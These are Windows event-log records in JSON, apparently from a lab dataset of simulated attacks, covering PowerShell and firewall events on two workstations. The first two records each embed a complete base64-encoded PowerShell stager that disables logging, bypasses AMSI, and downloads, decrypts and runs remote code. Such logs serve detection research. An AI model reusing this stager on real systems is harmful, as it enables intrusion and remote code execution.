{"Keywords":0,"SeverityValue":2,"EventReceivedTime":"2020-09-21 19:18:59","EventID":4103,"ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","ExecutionProcessID":7456,"Channel":"Microsoft-Windows-PowerShell/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ActivityID":"{3AF69DEC-79B4-0001-FA4C-0B856290D601}","UserID":"S-1-5-21-4228717743-1032521047-1810997296-1104","ThreadID":840,"EventType":"INFO","Opcode":"To be used when operation is just executing a method","EventTime":"2020-09-21 19:18:57","@timestamp":"2020-09-21T23:18:59.416Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"pgustavo","RecordNumber":162619,"Payload":"CommandInvocation(ForEach-Object): \"ForEach-Object\"\r\nParameterBinding(ForEach-Object): name=\"Process\"; value=\"$5793.Headers.Add($_.Name, $_.Value)\"\r\n","Task":106,"Domain":"THESHIRE","@version":"1","OpcodeValue":20,"SourceModuleName":"eventlog","ERROR_EVT_UNRESOLVED":true,"Severity":"INFO","ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.18362.752\r\n        Host ID = 1372cbf7-30b6-4e48-bce6-058659e77cf4\r\n        Host Application = C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBpAE8ATgBUAEEAQgBMAGUALgBQAFMAVgBlAHIAUwBJAE8ATgAuAE0AQQBKAG8AUgAgAC0ARwBFACAAMwApAHsAJABDADMAMgAyAD0AWwByAGUAZgBdAC4AQQBzAHMARQBNAEIAbABZAC4ARwBlAHQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkAEMAMwAyADIAKQB7ACQAYwA3ADQAMgA9ACQAQwAzADIAMgAuAEcARQB0AFYAQQBsAFUAZQAoACQAbgB1AGwATAApADsASQBGACgAJABjADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAQwA3ADQAMgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABDADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAEwAPQBbAEMATwBMAEwARQBjAHQAaQBvAG4AcwAuAEcARQBOAGUAUgBpAEMALgBEAGkAQwB0AGkAbwBOAEEAcgB5AFsAUwB0AFIASQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBKAGUAYwBUAF0AXQA6ADoATgBFAHcAKAApADsAJAB2AEEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEATAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGMANwA0ADIAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAVgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAUgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBFAHQARgBJAEUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUARQAoACQATgBVAEwATAAsACgATgBlAFcALQBPAEIASgBlAGMAdAAgAEMATwBMAGwARQBDAHQASQBPAE4AUwAuAEcAZQBuAEUAcgBpAGMALgBIAEEAcwBIAFMARQBUAFsAUwBUAHIAaQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUAZgBdAC4AQQBTAFMAZQBNAEIAbABZAC4ARwBFAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUAZQAoACQATgB1AGwATAAsACQAdAByAHUAZQApADsAfQA7AFsAUwBZAHMAdABFAE0ALgBOAGUAVAAuAFMARQBSAFYASQBjAGUAUABPAEkATgB0AE0AQQBuAEEAZwBFAHIAXQA6ADoARQBYAHAAZQBDAHQAMQAwADAAQwBPAG4AVABJAG4AVQBFAD0AMAA7ACQANQA3ADkAMwA9AE4AZQB3AC0ATwBCAGoARQBjAFQAIABTAFkAUwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAGkARQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAG4AQwBvAGQASQBuAEcAXQA6ADoAVQBOAEkAQwBPAEQAZQAuAEcARQB0AFMAVABSAGkATgBHACgAWwBDAG8AbgB2AGUAUgBUAF0AOgA6AEYAUgBPAG0AQgBBAFMARQA2ADQAUwB0AHIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADcAOQAzAC4ASABFAGEARABFAHIAUwAuAEEARABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANQA3ADkAMwAuAFAAUgBPAFgAWQA9AFsAUwB5AFMAVABFAE0ALgBOAEUAVAAuAFcAZQBiAFIARQBRAFUARQBTAHQAXQA6ADoARABlAEYAYQBVAEwAdABXAEUAQgBQAFIAbwBYAHkAOwAkADUANwA5ADMALgBQAFIAbwBYAHkALgBDAFIAZQBEAEUATgBUAGkAQQBMAHMAIAA9ACAAWwBTAFkAcwBUAEUATQAuAE4ARQBUAC4AQwBSAGUAZABFAG4AVABJAGEATABDAEEAQwBoAGUAXQA6ADoARABFAEYAQQBVAGwAdABOAGUAVABXAG8AcgBrAEMAUgBFAGQAZQBuAHQASQBhAEwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADcAOQAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAEUATQAuAFQAZQBYAHQALgBFAG4AYwBPAEQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAHQAQgB5AFQARQBzACgAJwAwAF0AcgBYADMAWQA0ADoAKAApAEoAYwBoAEEASwBrAFIANwBWAGcAKwBbAC8AVQBwADkAMgB0AG0ARwBRAHYAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AQgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAA1ADcAOQAzAC4ASABFAEEARABFAHIAcwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgB1AG8AUwBXAG8AaABuAGwAQwBZAGwAZgA9AEwAdwBMAHcAbwBiADAAZABMAEsATQBJAHQAUgBVAEgAOABnAEMAdQBWAEcAYgBBAGQAZABzAD0AIgApADsAJABkAEEAVABhAD0AJAA1ADcAOQAzAC4ARABvAHcAbgBsAG8AYQBkAEQAQQBUAEEAKAAkAFMARQByACsAJABUACkAOwAkAGkAVgA9ACQAZABBAHQAQQBbADAALgAuADMAXQA7ACQARABhAHQAYQA9ACQAZABBAHQAYQBbADQALgAuACQARABBAHQAQQAuAGwARQBOAEcAVABIAF0AOwAtAGoATwBJAG4AWwBDAEgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQAZABBAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 9da16ef2-d692-4dfe-ad5e-370bbf001fb9\r\n        Pipeline ID = 1\r\n        Command Name = ForEach-Object\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 13874\r\n        User = THESHIRE\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","SourceName":"Microsoft-Windows-PowerShell","Version":1,"Category":"Executing Pipeline","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":0,"SeverityValue":2,"EventReceivedTime":"2020-09-21 19:18:59","EventID":4103,"ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","ExecutionProcessID":7456,"Channel":"Microsoft-Windows-PowerShell/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ActivityID":"{3AF69DEC-79B4-0001-FB4C-0B856290D601}","UserID":"S-1-5-21-4228717743-1032521047-1810997296-1104","ThreadID":840,"EventType":"INFO","Opcode":"To be used when operation is just executing a method","EventTime":"2020-09-21 19:18:57","@timestamp":"2020-09-21T23:18:59.417Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"pgustavo","RecordNumber":162620,"Payload":"CommandInvocation(Get-Random): \"Get-Random\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/admin/get.php\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/news.php\"\r\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/login/process.php\"\r\n","Task":106,"Domain":"THESHIRE","@version":"1","OpcodeValue":20,"SourceModuleName":"eventlog","ERROR_EVT_UNRESOLVED":true,"Severity":"INFO","ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.18362.752\r\n        Host ID = 1372cbf7-30b6-4e48-bce6-058659e77cf4\r\n        Host Application = C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBpAE8ATgBUAEEAQgBMAGUALgBQAFMAVgBlAHIAUwBJAE8ATgAuAE0AQQBKAG8AUgAgAC0ARwBFACAAMwApAHsAJABDADMAMgAyAD0AWwByAGUAZgBdAC4AQQBzAHMARQBNAEIAbABZAC4ARwBlAHQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQB0AEYAaQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkAEMAMwAyADIAKQB7ACQAYwA3ADQAMgA9ACQAQwAzADIAMgAuAEcARQB0AFYAQQBsAFUAZQAoACQAbgB1AGwATAApADsASQBGACgAJABjADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQAQwA3ADQAMgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABDADcANAAyAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAVgBhAEwAPQBbAEMATwBMAEwARQBjAHQAaQBvAG4AcwAuAEcARQBOAGUAUgBpAEMALgBEAGkAQwB0AGkAbwBOAEEAcgB5AFsAUwB0AFIASQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBKAGUAYwBUAF0AXQA6ADoATgBFAHcAKAApADsAJAB2AEEATAAuAEEARABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AEEATAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGMANwA0ADIAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAVgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAUgBpAFAAdABCAEwATwBDAEsAXQAuACIARwBFAHQARgBJAEUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUARQAoACQATgBVAEwATAAsACgATgBlAFcALQBPAEIASgBlAGMAdAAgAEMATwBMAGwARQBDAHQASQBPAE4AUwAuAEcAZQBuAEUAcgBpAGMALgBIAEEAcwBIAFMARQBUAFsAUwBUAHIAaQBuAGcAXQApACkAfQAkAFIARQBGAD0AWwBSAEUAZgBdAC4AQQBTAFMAZQBNAEIAbABZAC4ARwBFAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBlAEYALgBHAEUAVABGAEkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAFUAZQAoACQATgB1AGwATAAsACQAdAByAHUAZQApADsAfQA7AFsAUwBZAHMAdABFAE0ALgBOAGUAVAAuAFMARQBSAFYASQBjAGUAUABPAEkATgB0AE0AQQBuAEEAZwBFAHIAXQA6ADoARQBYAHAAZQBDAHQAMQAwADAAQwBPAG4AVABJAG4AVQBFAD0AMAA7ACQANQA3ADkAMwA9AE4AZQB3AC0ATwBCAGoARQBjAFQAIABTAFkAUwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAGkARQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AHQALgBFAG4AQwBvAGQASQBuAEcAXQA6ADoAVQBOAEkAQwBPAEQAZQAuAEcARQB0AFMAVABSAGkATgBHACgAWwBDAG8AbgB2AGUAUgBUAF0AOgA6AEYAUgBPAG0AQgBBAFMARQA2ADQAUwB0AHIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADcAOQAzAC4ASABFAGEARABFAHIAUwAuAEEARABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANQA3ADkAMwAuAFAAUgBPAFgAWQA9AFsAUwB5AFMAVABFAE0ALgBOAEUAVAAuAFcAZQBiAFIARQBRAFUARQBTAHQAXQA6ADoARABlAEYAYQBVAEwAdABXAEUAQgBQAFIAbwBYAHkAOwAkADUANwA5ADMALgBQAFIAbwBYAHkALgBDAFIAZQBEAEUATgBUAGkAQQBMAHMAIAA9ACAAWwBTAFkAcwBUAEUATQAuAE4ARQBUAC4AQwBSAGUAZABFAG4AVABJAGEATABDAEEAQwBoAGUAXQA6ADoARABFAEYAQQBVAGwAdABOAGUAVABXAG8AcgBrAEMAUgBFAGQAZQBuAHQASQBhAEwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADcAOQAzAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwBUAEUATQAuAFQAZQBYAHQALgBFAG4AYwBPAEQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAHQAQgB5AFQARQBzACgAJwAwAF0AcgBYADMAWQA0ADoAKAApAEoAYwBoAEEASwBrAFIANwBWAGcAKwBbAC8AVQBwADkAMgB0AG0ARwBRAHYAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AQgBYAG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJAA1ADcAOQAzAC4ASABFAEEARABFAHIAcwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgB1AG8AUwBXAG8AaABuAGwAQwBZAGwAZgA9AEwAdwBMAHcAbwBiADAAZABMAEsATQBJAHQAUgBVAEgAOABnAEMAdQBWAEcAYgBBAGQAZABzAD0AIgApADsAJABkAEEAVABhAD0AJAA1ADcAOQAzAC4ARABvAHcAbgBsAG8AYQBkAEQAQQBUAEEAKAAkAFMARQByACsAJABUACkAOwAkAGkAVgA9ACQAZABBAHQAQQBbADAALgAuADMAXQA7ACQARABhAHQAYQA9ACQAZABBAHQAYQBbADQALgAuACQARABBAHQAQQAuAGwARQBOAEcAVABIAF0AOwAtAGoATwBJAG4AWwBDAEgAQQBSAFsAXQBdACgAJgAgACQAUgAgACQAZABBAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 9da16ef2-d692-4dfe-ad5e-370bbf001fb9\r\n        Pipeline ID = 1\r\n        Command Name = Get-Random\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 13876\r\n        User = THESHIRE\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","SourceName":"Microsoft-Windows-PowerShell","Version":1,"Category":"Executing Pipeline","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":-9214364837600034816,"SeverityValue":2,"Application":"\\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-09-17_150914\\guestagent\\windowsazureguestagent.exe","EventID":5158,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","EventReceivedTime":"2020-09-21 19:18:59","ProcessId":"3260","ThreadID":8004,"EventType":"AUDIT_SUCCESS","Opcode":"Info","EventTime":"2020-09-21 19:18:57","Message":"The Windows Filtering Platform has permitted a bind to a local port.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3260\r\n\tApplication Name:\t\\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-09-17_150914\\guestagent\\windowsazureguestagent.exe\r\n\r\nNetwork Information:\r\n\tSource Address:\t\t0.0.0.0\r\n\tSource Port:\t\t50588\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t0\r\n\tLayer Name:\t\tResource Assignment\r\n\tLayer Run-Time ID:\t36","FilterRTID":"0","@timestamp":"2020-09-21T23:18:59.417Z","LayerRTID":"36","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":784903,"Task":12810,"Protocol":"6","@version":"1","OpcodeValue":0,"SourcePort":"50588","SourceModuleName":"eventlog","Severity":"INFO","SourceName":"Microsoft-Windows-Security-Auditing","Version":0,"LayerName":"%%14608","Category":"Filtering Platform Connection","SourceAddress":"0.0.0.0","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":-9214364837600034816,"SeverityValue":2,"Application":"\\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-09-17_150914\\guestagent\\windowsazureguestagent.exe","EventID":5156,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","EventReceivedTime":"2020-09-21 19:18:59","ProcessId":"3260","ThreadID":8004,"EventType":"AUDIT_SUCCESS","Opcode":"Info","EventTime":"2020-09-21 19:18:57","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3260\r\n\tApplication Name:\t\\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-09-17_150914\\guestagent\\windowsazureguestagent.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.39.5\r\n\tSource Port:\t\t50588\r\n\tDestination Address:\t168.63.129.16\r\n\tDestination Port:\t\t80\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t80423\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","FilterRTID":"80423","RemoteUserID":"S-1-0-0","@timestamp":"2020-09-21T23:18:59.417Z","LayerRTID":"48","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":784904,"Task":12810,"Direction":"%%14593","@version":"1","OpcodeValue":0,"SourcePort":"50588","DestPort":"80","Protocol":"6","SourceModuleName":"eventlog","Severity":"INFO","DestAddress":"168.63.129.16","SourceName":"Microsoft-Windows-Security-Auditing","Version":1,"LayerName":"%%14611","RemoteMachineID":"S-1-0-0","Category":"Filtering Platform Connection","SourceAddress":"172.18.39.5","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":-9214364837600034816,"SeverityValue":2,"Application":"\\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-09-17_150921\\guestagent\\windowsazureguestagent.exe","EventID":5158,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","EventReceivedTime":"2020-09-21 19:18:59","ProcessId":"3476","ThreadID":5464,"EventType":"AUDIT_SUCCESS","Opcode":"Info","EventTime":"2020-09-21 19:18:57","Message":"The Windows Filtering Platform has permitted a bind to a local port.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3476\r\n\tApplication Name:\t\\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-09-17_150921\\guestagent\\windowsazureguestagent.exe\r\n\r\nNetwork Information:\r\n\tSource Address:\t\t0.0.0.0\r\n\tSource Port:\t\t51198\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t0\r\n\tLayer Name:\t\tResource Assignment\r\n\tLayer Run-Time ID:\t36","FilterRTID":"0","@timestamp":"2020-09-21T23:18:59.417Z","LayerRTID":"36","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":844253,"Task":12810,"Protocol":"6","@version":"1","OpcodeValue":0,"SourcePort":"51198","SourceModuleName":"eventlog","Severity":"INFO","SourceName":"Microsoft-Windows-Security-Auditing","Version":0,"LayerName":"%%14608","Category":"Filtering Platform Connection","SourceAddress":"0.0.0.0","tags":["mordorDataset"],"Hostname":"WORKSTATION6.theshire.local"}
{"Keywords":-9214364837600034816,"SeverityValue":2,"Application":"\\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-09-17_150921\\guestagent\\windowsazureguestagent.exe","EventID":5156,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","EventReceivedTime":"2020-09-21 19:18:59","ProcessId":"3476","ThreadID":5464,"EventType":"AUDIT_SUCCESS","Opcode":"Info","EventTime":"2020-09-21 19:18:57","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3476\r\n\tApplication Name:\t\\device\\harddiskvolume2\\windowsazure\\guestagent_2.7.41491.993_2020-09-17_150921\\guestagent\\windowsazureguestagent.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tOutbound\r\n\tSource Address:\t\t172.18.39.6\r\n\tSource Port:\t\t51198\r\n\tDestination Address:\t168.63.129.16\r\n\tDestination Port:\t\t80\r\n\tProtocol:\t\t6\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t79916\r\n\tLayer Name:\t\tConnect\r\n\tLayer Run-Time ID:\t48","FilterRTID":"79916","RemoteUserID":"S-1-0-0","@timestamp":"2020-09-21T23:18:59.417Z","LayerRTID":"48","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":844254,"Task":12810,"Direction":"%%14593","@version":"1","OpcodeValue":0,"SourcePort":"51198","DestPort":"80","Protocol":"6","SourceModuleName":"eventlog","Severity":"INFO","DestAddress":"168.63.129.16","SourceName":"Microsoft-Windows-Security-Auditing","Version":1,"LayerName":"%%14611","RemoteMachineID":"S-1-0-0","Category":"Filtering Platform Connection","SourceAddress":"172.18.39.6","tags":["mordorDataset"],"Hostname":"WORKSTATION6.theshire.local"}
